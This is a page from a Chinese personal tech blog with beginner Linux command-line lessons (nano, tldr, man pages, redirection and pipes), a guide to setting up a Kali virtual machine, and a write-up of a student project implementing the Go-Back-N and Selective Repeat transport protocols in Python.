<p>更多细节可以参考本系列的下一篇教程，不过下一篇教程难度距离本篇高了一截，推荐已经使用一段时间Linux、对计算机整体架构有基本认识的读者阅读。</p>
<h4 id="编辑文件"><a href="#编辑文件" class="headerlink" title="编辑文件"></a>编辑文件</h4><p>我们观察nano底部的操作栏，可以找到左下角的Exit。这里的 <code>^X</code> 表示Ctrl+X的意思。因此我们使用这个组合键来退出。退出以后，我们按 ↑ 键即可取出上次我们执行的指令，然后再敲 Home 键（数字键盘附近的）将光标提到最前面，输入 <code>sudo</code>空格，敲击enter。</p>
<p><code>$ sudo nano sources.list</code></p>
<p>这里会提示我们输入密码，如果是kali系统就输入默认密码 <code>kali</code>。</p>
<p>进入nano编辑器的界面后，复制中科大源的两个链接，将光标移到开头之后使用 Ctrl+Shift+V 来将其黏贴上去。这个编辑器的逻辑和我们常用的记事本等差不多，所以大家可以自行修改。</p>
<p>修改完成以后，先使用 Ctrl+S 进行保存，然后再 Ctrl+X 退出即可。</p>
<blockquote>
<p>当然你也可以用教程中的其他方法完成换源</p>
</blockquote>
<p>感觉如何？命令行的编辑器也可以非常强大，不论是功能性、美观性还是方便性的角度都是如此。有一款各种Linux都会自带的编辑器被许多人称为”编辑器之神“，它就是大名鼎鼎的Vim。如果你有兴趣，可以在 <a target="_blank" rel="noopener" href="https://missing-semester-cn.github.io/2020/editors/">编辑器 (Vim) · the missing semester</a> 进行了解。</p>
<h3 id="好吧我知道这个很有用-但是这个指令咋用啊-：tldr"><a href="#好吧我知道这个很有用-但是这个指令咋用啊-：tldr" class="headerlink" title="好吧我知道这个很有用,但是这个指令咋用啊?：tldr"></a>好吧我知道这个很有用,但是这个指令咋用啊?：tldr</h3><p>在计算机的世界中，有着许许多多的奇怪缩写，接下来介绍的这个软件就有一个非常奇怪的缩写：<code>tldr</code></p>
<blockquote>
<p>too long don’t read: 太长不看</p>
</blockquote>
<p>接下来我们将会展示如何安装这个软件。在安装软件之前，先更新一下本地的资源目录是一个很好的习惯：</p>
<p><code>$ sudo apt update</code></p>
<p>它会提示你有多少个包可以更新，我们可以选择先别管他，因为刚刚安装系统后更新可能要很久（我这里有781个包要更新）。我们输入：</p>
<p><code>$ sudo apt install tldr</code></p>
<p>经过一些提示信息，当我们再次看到prompt的时候，就说明这个软件已经装好了。我们可以试着运行一下它，来看看到底是不是装好了：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ tldr</span><br><span class="line">tealdeer 1.5.0</span><br><span class="line">Danilo Bargen &lt;mail@dbrgn.ch&gt;, Niklas Mohrin &lt;dev@niklasmohrin.de&gt;</span><br><span class="line">A fast TLDR client</span><br><span class="line"></span><br><span class="line">USAGE:</span><br><span class="line">    tldr [OPTIONS] [COMMAND]...</span><br><span class="line"></span><br><span class="line">ARGS:</span><br><span class="line">    &lt;COMMAND&gt;...    The <span class="built_in">command</span> to show (e.g. `tar` or `git <span class="built_in">log</span>`)</span><br><span class="line">    </span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>接下来，我们还需要更新一下这个软件的本地缓存（可能会有些慢）：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tldr --update  <span class="comment"># 你也可以用-u来代替--update</span></span><br><span class="line">Successfully updated cache.</span><br></pre></td></tr></table></figure>

<p>在这之后，我们就可以愉快地使用这个软件了！让我们用一个经典的递归式查询来查询一下tldr的用法：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ tldr tldr    </span><br><span class="line"></span><br><span class="line">  Display simple <span class="built_in">help</span> pages <span class="keyword">for</span> command-line tools from the tldr-pages project.</span><br><span class="line">  More information: &lt;https://tldr.sh&gt;.</span><br><span class="line"></span><br><span class="line">  Print the tldr page <span class="keyword">for</span> a specific <span class="built_in">command</span> (hint: this is how you got here!):</span><br><span class="line"></span><br><span class="line">      tldr <span class="built_in">command</span></span><br><span class="line"></span><br><span class="line">  Print the tldr page <span class="keyword">for</span> a specific subcommand:</span><br><span class="line"></span><br><span class="line">      tldr command-subcommand</span><br><span class="line"></span><br><span class="line">  Print the tldr page <span class="keyword">for</span> a <span class="built_in">command</span> <span class="keyword">for</span> a specific [p]latform:</span><br><span class="line"></span><br><span class="line">      tldr -p android|linux|osx|sunos|windows <span class="built_in">command</span></span><br><span class="line"></span><br><span class="line">  [u]pdate the <span class="built_in">local</span> cache of tldr pages:</span><br><span class="line"></span><br><span class="line">      tldr -u</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>想知道什么指令的用法，或者不记得哪个指令怎么用了，直接使用 <code>tldr &lt;命令名&gt;</code> 就能快速地查到这个软件常用的用法了。</p>
<p>作为习题，你可以挑战一下快速找到如何使用apt来列出本机安装的软件包、如何将本机的软件包升级到最新的版本、以及如何删除一个软件包（删除时请一定小心！初学时笔者曾尝试删除python2，导致系统里许多依赖python的软件都无法正常运行，桌面软件都爆炸了，花了好久才给救回来）。</p>
<h3 id="查询非常用用法：Manual手册"><a href="#查询非常用用法：Manual手册" class="headerlink" title="查询非常用用法：Manual手册"></a>查询非常用用法：Manual手册</h3><p>我们使用tldr查询用法时，实际上是一种”非官方渠道“，也就是由非官方的组织收集得来的常用用法。这其实并不能保证查到的用法一定是正确的、我们想要的，也不能帮助我们将一个软件的功能发挥到极致。</p>
<p>如何查询一个指令&#x2F;软件的官方用法？答案是使用 <code>man</code> 指令，其全称是 <code>manual</code> （手册）。基本上每个软件或指令都会有对应的、由官方编写的、规范化的文档，我们通过man来阅读它们。如果没有对应的 man page 的话，这表示这个指令可能是由shell程序自己实现的而不是一个独立的软件，这时候可以通过 <code>help xxx</code> 来查看其用法。</p>
<p>这里又引出了另一个非常奇怪的缩写：<strong>RTFM</strong>，以下是两种解释（看你想如何理解）</p>
<blockquote>
<p>Read the F**king Manual：快™去读手册！！</p>
<p>Read the Friendly Manual：去看看友好的手册吧~</p>
</blockquote>
<p>早年间，很多伸手党小白会在网络上提非常简单的问题，这时候懒得回答的暴躁老哥就会说出这句经典缩写。这个小故事启发我们：当遇到不懂的事情，多查查手册这一官方出品的一手资料，慢慢地你一定会变得更有耐心、更能解决问题、<del>英语阅读分更高</del>。</p>
<p>另外，在man的页面当中使用 <code>/</code> 可以在当前文档中向后搜索关键词，使用 <code>n</code> 来切换到下一个搜索结果，使用 <code>shift+n</code> （就是大写N）来切换到上一个搜索结果。这个功能会很有用。</p>
<p>让我们做个小练习，请借助 <code>man ls</code> ，找到能做到以下效果的指令：</p>
<ul>
<li>打印隐藏的文件</li>
<li>大小以人类可以理解的格式显示（比如显示 454M 而不是 454279954）</li>
<li>文件以最近访问顺序排序</li>
</ul>
<h3 id="我是MARIO：iostream重定向-amp-pipes管道"><a href="#我是MARIO：iostream重定向-amp-pipes管道" class="headerlink" title="我是MARIO：iostream重定向 &amp; pipes管道"></a>我是MARIO：iostream重定向 &amp; pipes管道</h3><p>上过C语言和C++的大家应该知道，命令行程序有三个默认打开的“流”，分别是stdin，stdout以及stderr。在我们运行命令行程序时，标准输入就是我们敲进去的东西，而程序打印东西到stdout或者stderr，其实就是打印到命令行上。</p>
<p>在学习C或C++的文件操作的时候，会发现一个很巧的事情——文件读写用到的API，和标准输入输出用的那些API其实都差不多，这是因为文件和标准输入输出本来就是一样的。在Linux系统中，<strong>一切皆文件</strong>。不仅传统意义上的文本文件、多媒体文件等普通文件是文件，套接字（网络接口）、键盘鼠标设备等等都是文件，可以用统一的一套文件API进行处理。</p>
<p>这种设计不仅带来了极大的统一性，也带来了极大的便捷性。本节介绍的iostream重定向和pipes管道就与这种设计有关。</p>
<p>既然stdin和stdout也是<strong>文件流</strong>，那么我们当然可以把他们<strong>重定向</strong>到一个普通文件！我们让一个文件被定向到一个程序的标准输入，或者让一个程序的标准输出定向到一个文件当中。前者我们使用 <code>&lt; file</code>，后者我们使用 <code>&gt; file</code>，如下所示：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> hello &gt; hello.txt		<span class="comment"># 把stdout重定向到hello.txt中</span></span><br><span class="line">$ <span class="built_in">cat</span> hello.txt</span><br><span class="line">hello</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> &lt; hello.txt				<span class="comment"># 把hello.txt重定向到cat的标准输入</span></span><br><span class="line">hello</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> &lt; hello.txt &gt; hello2.txt	<span class="comment"># 同时重定向cat的标准输入和标准输出</span></span><br><span class="line">$ <span class="built_in">cat</span> hello2.txt</span><br><span class="line">hello</span><br></pre></td></tr></table></figure>

<p>那我们能不能把两个程序首位相连呢？把第一个程序的标准输出用作第二个程序的标准输入，在这两个程序之间构造一条虚拟的管道！这种神奇的操作是通过 <code>|</code> 来完成的：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> 1.txt           </span><br><span class="line">GODEL</span><br><span class="line">ESCHER</span><br><span class="line">BACH</span><br><span class="line">$ <span class="built_in">cat</span> 1.txt | <span class="built_in">tail</span> -n1	<span class="comment"># 打印1.txt的最后一行</span></span><br><span class="line">BACH</span><br><span class="line">$ <span class="built_in">cat</span> 1.txt | grep CH 	<span class="comment"># 寻找1.txt中带有CH的行</span></span><br><span class="line">ESCHER</span><br><span class="line">BACH</span><br></pre></td></tr></table></figure>

<p><del>据说，传奇的命令行大师会用管道构造一长条链，我们尊称其为Mario。</del></p>
<h2 id="Play-with-Shell"><a href="#Play-with-Shell" class="headerlink" title="Play with Shell"></a>Play with Shell</h2><p>接下来，笔者推荐有空的读者试试看一个<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Wargame_(hacking)">Wargame</a>，链接是<a target="_blank" rel="noopener" href="https://overthewire.org/wargames/bandit/">OverTheWire: Bandit</a>。这个闯关游戏能帮助初学者快速掌握各种命令行常用工具的用法。在有了本教程的基础以后，这个游戏仍然有一定的挑战性，需要广泛地收集资料。</p>
<p>在这里，最后介绍一个奇怪的缩写：<strong>STFW</strong></p>
<blockquote>
<p>Search The Friendly Web: 去搜搜互联网吧，相信你能找到想要的</p>
</blockquote>
<blockquote>
<p>Remember - this stuff is not easy if you don’t know much, so google everything, question everything, and sooner or later you’ll be down the rabbit hole far enough to be enjoying yourself.</p>
<p>— How to start hacking? - r&#x2F;hacking</p>
</blockquote>
<p>祝愿大家能通过这个Wargame，从此发现一个不一样的计算机世界。</p>
<hr>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>强烈推荐：<a target="_blank" rel="noopener" href="https://missing-semester-cn.github.io/">计算机教育中缺失的一课 · the missing semester</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Tool/47d132dae007.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Tool/47d132dae007.html" class="post-title-link" itemprop="url">【Tool#0x01】Linux(Kali) 环境配置</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-06-25 19:30:00" itemprop="dateCreated datePublished" datetime="2023-06-25T19:30:00+08:00">2023-06-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:34:24" itemprop="dateModified" datetime="2024-01-11T16:34:24+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Tool/" itemprop="url" rel="index"><span itemprop="name">Tool</span></a>
                </span>
            </span>

          
            <span id="/Tech/Tool/47d132dae007.html" class="post-meta-item leancloud_visitors" data-flag-title="【Tool#0x01】Linux(Kali) 环境配置" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Tool/47d132dae007.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Tool/47d132dae007.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>为了和之后的网络工具介绍环节联动，Linux常见指令教学将会使用Kali进行。</p>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>首先需要装一个VMware。由于夏令营的安卓逆向部分会用到与hyper-V不兼容的安卓模拟器，因此这里不推荐WSL了 (&#96;ε´)。</p>
<p>VMware Workstation Player官网下载链接：<a target="_blank" rel="noopener" href="https://www.vmware.com/cn/products/workstation-player.html">VMware Workstation Player | VMware | CN</a></p>
<p>VMware Workstation Pro可以自行找链接下载（然后网上搜一个注册码），但是我们不鼓励盗版！</p>
<p>在安装完毕之后，我们直接下载开箱即用的Kali虚拟机，下载链接：<a target="_blank" rel="noopener" href="https://www.kali.org/get-kali/#kali-virtual-machines">Get Kali | Kali Linux</a></p>
<p>下载完之后，找一个好地方解压（这个Kali虚拟机需要一直保存在那个地方），然后打开VMware，在左上角的文件菜单中点击打开，找到你刚刚解压出来的文件夹中的 <code>kali-linux-...-amd64.vmx</code> 打开，这一步之后你就拥有了一台Kali虚拟机！</p>
<p>默认的账号和密码都是 <code>kali</code>，开始你的Linux之旅吧！</p>
<h2 id="MacOS-M1-x2F-M2"><a href="#MacOS-M1-x2F-M2" class="headerlink" title="MacOS(M1&#x2F;M2)"></a>MacOS(M1&#x2F;M2)</h2><p>请看<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1KM9H6lmGSSCM9gkZRkvwlg?pwd=tv8x">J3rry同学编写的教程</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Network/b81b909d9b2a.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Network/b81b909d9b2a.html" class="post-title-link" itemprop="url">【Network#0x01】RDT协议实现（GBN和SR）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-06-05 14:33:29" itemprop="dateCreated datePublished" datetime="2023-06-05T14:33:29+08:00">2023-06-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:34:36" itemprop="dateModified" datetime="2024-01-11T16:34:36+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Network/" itemprop="url" rel="index"><span itemprop="name">Network</span></a>
                </span>
            </span>

          
            <span id="/Tech/Network/b81b909d9b2a.html" class="post-meta-item leancloud_visitors" data-flag-title="【Network#0x01】RDT协议实现（GBN和SR）" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Network/b81b909d9b2a.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Network/b81b909d9b2a.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在这学期计网的PJ中，我<del>被迫</del>实现了GBN协议、基于连接的全双工可信传输协议，并在此基础上改造了SR协议版本，并为其添加了基础的拥塞控制机制（AIMD）。<br>这是<a target="_blank" rel="noopener" href="https://github.com/Cameudis/RDT-protocol">Github项目仓库</a>。</p>
<p>主体是gbn.py以及sr.py，API接口模仿socket设计，均能连续通过200轮测试。下面是使用例（这就是全部API了）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sr_server.py</span></span><br><span class="line"><span class="keyword">from</span> sr <span class="keyword">import</span> SRSocket</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">PORT = <span class="number">8000</span></span><br><span class="line"></span><br><span class="line">s = SRSocket()</span><br><span class="line">s.bind((HOST, PORT))</span><br><span class="line"></span><br><span class="line">s.listen()</span><br><span class="line">s.accept()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Connected by&#x27;</span>, s.address)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;server/recv.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data = s.recv()</span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">b&quot;&quot;</span>: <span class="comment"># 空的数据包标识文件结束</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    f.write(data)</span><br><span class="line"></span><br><span class="line">f.close()</span><br><span class="line">s.send(<span class="string">b&quot;Thank you for your data!&quot;</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sn_client.py</span></span><br><span class="line"><span class="keyword">from</span> sr <span class="keyword">import</span> SRSocket</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">PORT = <span class="number">8000</span></span><br><span class="line"></span><br><span class="line">s = SRSocket()</span><br><span class="line">s.connect((HOST, PORT))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Connect to&#x27;</span>, s.address)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;client/data.jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">s.send(data)  <span class="comment"># 阻塞的</span></span><br><span class="line">s.send(<span class="string">b&quot;&quot;</span>)   <span class="comment"># 用空的payload表示文件发送结束</span></span><br><span class="line"><span class="built_in">print</span>(s.recv().decode())</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<p>客户端将会把图片 <code>client/data.jpg</code> 传输至服务器端，服务器保存图片至文件 <code>server/recv.jpg</code> 后，将会给客户端发送一条信息，客户端接收并将其打印出来。</p>
<p>由于是全双工的，所以客户端可以给服务器发送消息，服务器也可以给客户端发送消息。</p>
<h2 id="1-GBN"><a href="#1-GBN" class="headerlink" title="1 GBN"></a>1 GBN</h2><h3 id="1-1-准备"><a href="#1-1-准备" class="headerlink" title="1.1 准备"></a>1.1 准备</h3><p>为了保证全双工的一致性，从一开始就准备将服务器端协议实现和客户端协议实现放在一个类中，命名为GBNSocket。为了方便起见，我直接模仿socket的api，主要是如下这些函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 客户端</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>(<span class="params">address</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务端</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bind</span>(<span class="params">address</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">listen</span>()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">accept</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通用</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">data</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv</span>(<span class="params">[size]</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close</span>()</span><br></pre></td></tr></table></figure>

<p>真实的accpet函数会返回一个新的套接字，我将其简化为自身就变成与之通信的套接字。</p>
<p>我设计的数据包结构为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span> seqNum;</span><br><span class="line">    <span class="type">uint8_t</span> ackNum; </span><br><span class="line">    <span class="type">uint8_t</span> flag;</span><br><span class="line">    <span class="type">uint8_t</span> checkSum;</span><br><span class="line">    <span class="type">uint8_t</span> data[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中flag字段有三个有效bit，定义为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYN = <span class="number">1</span></span><br><span class="line">FIN = <span class="number">2</span></span><br><span class="line">ACK = <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>而checkSum计算方法非常简单粗暴，就是把所有字节加起来（模加法），如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getChecksum</span>(<span class="params">data</span>):</span><br><span class="line">    length = <span class="built_in">len</span>(<span class="built_in">str</span>(data))</span><br><span class="line">    checksum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length):</span><br><span class="line">        checksum += <span class="built_in">int</span>.from_bytes(<span class="built_in">bytes</span>(<span class="built_in">str</span>(data)[i], encoding=<span class="string">&#x27;utf-8&#x27;</span>), byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">        checksum &amp;= <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">return</span> checksum</span><br></pre></td></tr></table></figure>

<h3 id="1-2-滑动窗口"><a href="#1-2-滑动窗口" class="headerlink" title="1.2 滑动窗口"></a>1.2 滑动窗口</h3><p>我为每个socket维护了两个buffer数组，分别用于发送和接收数据（<code>sdata</code> 以及 <code>rdata</code>）。<br>相关的一些指针（其实是index）定义和用途如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># send</span></span><br><span class="line">self.sdata = [<span class="literal">None</span>] * <span class="number">256</span>   <span class="comment"># send data buffer</span></span><br><span class="line">self.spos = <span class="number">0</span>               <span class="comment"># send position (last available sdata + 1)</span></span><br><span class="line">self.sbase = <span class="number">0</span>              <span class="comment"># send base</span></span><br><span class="line">self.snext = <span class="number">0</span>              <span class="comment"># next seq to be sent</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># receive</span></span><br><span class="line">self.rdata = [<span class="literal">None</span>] * <span class="number">256</span>   <span class="comment"># receive data buffer</span></span><br><span class="line">self.rbase = <span class="number">0</span>              <span class="comment"># receive base (not return to app yet)</span></span><br><span class="line">self.rexpect = <span class="number">0</span>            <span class="comment"># expected next seq</span></span><br></pre></td></tr></table></figure>

<p>这些数据在计算时全都模256进行，所以有些运算会很烦，这是我在实现协议时遇到的主要困难之一。</p>
<p>在发送包时，由于是GBN协议，因此seqNum和ackNum两个字段分别用于表示“本条消息对应的序列号”以及“我希望收到的下一个包的序列号”。这里ackNum是一种累计确认，表示自己之前的所有数据包已经接收完毕。</p>
<h3 id="1-3-雏形"><a href="#1-3-雏形" class="headerlink" title="1.3 雏形"></a>1.3 雏形</h3><p>最重要的函数显然是send和recv。<br>我将send、recv、以及一个辅助函数_wait的职能总结如下：</p>
<ul>
<li>send：将新的数据安排到 <code>self.sdata</code> 数组中（更新 <code>self.spos</code>），并在循环中根据窗口大小，发送之前没有发送过的新包（拓展 <code>self.snext</code>）。通过调用 <code>self.wait</code> 来更新 <code>self.sbase</code> ，直到所有将要发送的数据都发送完毕（<code>self.sbase == self.spos</code>）。</li>
<li>recv：<code>self.rbase</code> 表示当前没有被返回至上层的最后一个包，<code>self.rexpect</code> 表示当前已经可以返回的最后一个包。如果它俩相等，说明现在没有可以返回的包，那么recv会调用 <code>self.wait</code> 来更新 <code>self.rexpect</code>；否则recv会返回一个包的数据。</li>
<li>wait：核心函数（不属于API的一部分），负责处理收到的所有包、根据其类型来进行各种操作如发送ACK、存储数据等。其本质是更新 <code>self.sbase</code> 和 <code>self.rexpect</code>。它有recv模式，在该模式下一次超时就会返回调用者（用于recv）；除此以外，它会在结束或遇到错误（如超时次数过多）时返回false，在 <code>self.sbase == self.snext</code> 时（即所有包都确认完毕）返回true。</li>
</ul>
<p>由于是Go-Back-N协议，因此在wait中，如果发生超时，那么从 <code>self.sbase</code> 到 <code>self.snext</code> 的所有包都会被重传。</p>
<p>注意：wait是客户端和服务器端都会使用的函数，因此实现了全双工的统一性。</p>
